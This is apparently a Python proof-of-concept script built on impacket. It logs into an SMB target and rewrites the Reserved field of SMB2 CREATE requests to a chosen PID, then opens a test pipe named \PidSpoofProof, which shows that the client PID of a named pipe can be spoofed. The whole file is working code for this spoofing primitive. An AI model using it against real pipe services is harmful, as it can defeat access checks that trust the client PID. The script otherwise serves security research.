#!/usr/bin/env python3
"""Prove that Windows maps SMB2 CREATE Reserved into the NPFS client PID."""

import argparse
import time
import types

from impacket import smb, smb3
from impacket.smb3structs import (
    FILE_NON_DIRECTORY_FILE,
    FILE_OPEN,
    FILE_READ_DATA,
    FILE_SHARE_READ,
    FILE_SHARE_WRITE,
    FILE_WRITE_DATA,
    SMB2_CREATE,
)
from impacket.smbconnection import SMBConnection


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("target")
    parser.add_argument("--username", required=True)
    parser.add_argument("--password", required=True)
    parser.add_argument("--domain", required=True)
    parser.add_argument("--pid", required=True, type=int)
    args = parser.parse_args()

    connection = SMBConnection(args.target, args.target, sess_port=445, timeout=10)
    connection.login(args.username, args.password, args.domain)
    if connection.getDialect() == smb.SMB_DIALECT:
        raise RuntimeError("SMB1 negotiated")
    server = connection.getSMBServer()
    if not isinstance(server, smb3.SMB3):
        raise RuntimeError("SMB2/3 implementation unavailable")

    original = server.sendSMB

    def patched(_server, packet):
        if int(packet["Command"]) == SMB2_CREATE:
            packet["Reserved"] = args.pid
            print("SERIALIZED_CREATE_RESERVED=" + str(args.pid), flush=True)
        return original(packet)

    server.sendSMB = types.MethodType(patched, server)
    tree = connection.connectTree("IPC$")
    try:
        connection.waitNamedPipe(tree, r"\PidSpoofProof", timeout=5)
        handle = connection.openFile(
            tree,
            r"\PidSpoofProof",
            desiredAccess=FILE_READ_DATA | FILE_WRITE_DATA,
            shareMode=FILE_SHARE_READ | FILE_SHARE_WRITE,
            creationOption=FILE_NON_DIRECTORY_FILE,
            creationDisposition=FILE_OPEN,
        )
        time.sleep(2)
        connection.closeFile(tree, handle)
    finally:
        server.sendSMB = original
        connection.disconnectTree(tree)
        connection.logoff()


if __name__ == "__main__":
    main()
